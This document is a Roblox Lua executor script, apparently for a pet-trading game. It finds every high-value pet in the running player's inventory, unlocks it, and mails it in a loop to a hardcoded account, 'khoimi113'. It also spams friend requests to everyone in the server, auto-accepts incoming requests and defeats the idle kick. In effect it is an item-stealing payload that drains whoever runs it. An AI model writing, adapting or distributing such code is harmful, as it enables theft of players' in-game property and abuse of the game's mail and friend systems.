local start = tick()
repeat task.wait() until game:IsLoaded() and game.Players.LocalPlayer

_G.EnableFriendRequest = true;
_G.WaitToSendFriend = 300;

_G.Enable = true;

--_G.Objects_Target = {Pet = {"Shadow Griffin"}, Misc = {}};
_G.Value = 4000000;
_G.Username = "khoimi113";
_G.Message = "khoi";
_G.WaitToClaim = 30;
_G.WaitToSendIfEnough = 300;
_G.WaitToSend = 0.5;

_G.ClaimMail = false;

_G.max = nil;

local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game.ReplicatedStorage
local Players = game:GetService('Players')
local Client = Players.LocalPlayer
local VirtualUser = game:GetService('VirtualUser')

local v5 = require(ReplicatedStorage.Library.Items.Types);
local v22 = require(ReplicatedStorage.Library.Client.Network);
local v13 = require(ReplicatedStorage.Library.Client.GUI);

local v37 = v13.MailboxMachine();
local l_Frame_0 = v37.Frame;
local l_GiftsFrame_0 = l_Frame_0:FindFirstChild("GiftsFrame");
local l_SendFrame_0 = l_Frame_0:FindFirstChild("SendFrame");

local l_ItemsFrame_1 = l_GiftsFrame_0.ItemsFrame;
local l_Amount_0 = l_SendFrame_0.Bottom.Coins.Frame.Amount;

function Update()
    local results = {}
    
    --for typeO, tbl in pairs(_G.Objects_Target) do
        for v127, v128 in pairs(v5.Types[tostring("Pet")]:All()) do
            local _stackKey = HttpService:JSONDecode(v128._stackKey)
            
            --for _, name in next, tbl do
                local name = _stackKey.id
                local lower = string.lower(name)
        
                if ReplicatedStorage.__DIRECTORY.Pets:FindFirstChild(name) and require(ReplicatedStorage.__DIRECTORY.Pets[name]).difficulty >= _G.Value --[[and string.find(string.lower(_stackKey.id), lower)]] then
                    local _data = v128._data
                    local id_Pet = v128._uid
                    local amount = _data._am or 1
                    local name = _data.id or "NULL"
                    local class = v128.class or "Pet"
                    local locked = v128._lk
                    local typeD = not _data.pt and "Normal" --or _data.pt == 1 and "Golden" or _data.pt == 2 and "Rainbow"

                    local folder = name:find("Huge") and "Huge" --[[or name:find("Titanic") and "Titanic"]] or "Uncategorized"
                    --table.foreach(v128, warn)
                    results[id_Pet] = {
                        Amount = _G.max ~= nil and _G.max or amount,
                        Name = name,
                        Class = class,
                        Type = typeD,
                        Folder = folder,
                        Locked = locked,
                    }

                    --break
                end
            --end
        end
    --end
    
    return results  -- Trả về bảng kết quả
end

function convertNotation(value)
    local suffixes = {
        ["k"] = 10^3,   -- K = 1,000
        ["m"] = 10^6,   -- M = 1,000,000
        ["b"] = 10^9,   -- B = 1,000,000,000
        ["t"] = 10^12,  -- T = 1,000,000,000,000
    }
    
    -- Kiểm tra xem có ký hiệu không
    local number, suffix = string.match(value, "^(%d*%.?%d+)(%a?)$")
    
    if suffixes[suffix] then
        return tonumber(number) * suffixes[suffix]
    else
        return tonumber(number)
    end
end

local GetSave = function()
    return require(ReplicatedStorage.Library.Client.Save).Get()
end

function GetCurrentCoins()
    for i, v in pairs(GetSave().Inventory.Currency) do
        if v.id == "Coins" then
            return v._am
        end
    end
    return 0
end

Client.Idled:connect(function()
    VirtualUser:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
    wait(1)
    VirtualUser:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
end)

local function ClaimMail()
    local l_l_ItemsFrame_1_Children_0 = l_ItemsFrame_1:GetChildren();

    local readytoClaim = {}
    for _, v150 in ipairs(l_l_ItemsFrame_1_Children_0) do
        if not v150:isA("UIPadding") and not v150:isA("UIGridLayout") then
            table.insert(readytoClaim, v150.Name)
        end;
    end;
    
    v22.Invoke("Mailbox: Claim", readytoClaim)
end

task.spawn(function()
    while _G.Enable and task.wait(1) do
        
        for id, v in pairs(Update()) do
            local amount, name, class, type, locked = v.Amount, v.Name, v.Class, v.Type, v.Locked
            if id and amount then
        
                local Current_Diamond = GetCurrentCoins()
                if Current_Diamond >= convertNotation(l_Amount_0.Text) then
                    --if locked then
                        v22.Invoke("Locking_SetLocked", id, false)
                    --end
                    --print(name, class, id, amount)
                    local v134, v135 = v22.Invoke("Mailbox: Send", _G.Username, _G.Message, class, id, amount)
                    --print(v134, v135)
                    --print("Send pet successfully")
                    --print("Current Cost:", convertNotation(l_Amount_0.Text), "Can send:", Current_Diamond > 0)
                else
                    --warn("Không đủ gems để gửi. Số gems hiện tại:", GetCurrentCoins())
                    wait(_G.WaitToSendIfEnough)
                    break
                end
        
                task.wait(_G.WaitToSend)
            end
        end
    end
end)

task.spawn(function()
    while _G.ClaimMail do
        ClaimMail()
        task.wait(_G.WaitToClaim)
    end
end)

task.spawn(function()
    while _G.EnableFriendRequest do
        for _,v in pairs(Players:GetChildren()) do
            if v ~= Client then
                Client:RequestFriendship(v)
                warn("Send request:",v.Name)
            end
            --wait(1)
        end
        task.wait(_G.WaitToSendFriend)
    end
end)

task.spawn(function()
    while task.wait() do
        local confirmButton = game:GetService("CoreGui").PlayerList.Children.OffsetFrame.PlayerScrollList.SizeOffsetFrame
        .ScrollingFrameContainer.PlayerDropDown.InnerFrame.FriendButton.CurrentButtonContainer.DropDownButton.HoverBackground.ButtonContainer.ConfirmButton
    
        if game:GetService("CoreGui").PlayerList.Children.OffsetFrame.PlayerScrollList.SizeOffsetFrame.ScrollingFrameContainer.PlayerDropDown.InnerFrame.FriendButton.CurrentButtonContainer.DropDownButton.HoverBackground.Text.Text == "Accept" then
            for _, connection in ipairs(getconnections(confirmButton.Activated)) do
                if connection.Function then
                    connection:Fire()
                    print("Accepted Successfully")
                end
            end
        end
    end
end)

-- local l_ClaimAll_0 = l_Frame_0.OptionsFrame.ClaimAll;

-- table.foreach(getconnections(l_ClaimAll_0.Activated), function(_,v)
--     v.Function();
-- end)
-- spawn(function()
--     local v22 = require(ReplicatedStorage.Library.Client.Network);
--     local v23 = require(ReplicatedStorage.Library.Signal);
--     local v60 = v22.Invoke("Mailbox: Request");
    
--     warn(v22.Invoke("Mailbox: Request"))
-- end)

local v21 = require(ReplicatedStorage.Library.Client.Message);
print(v21.New("You can't send Diamonds with an Item!", true))
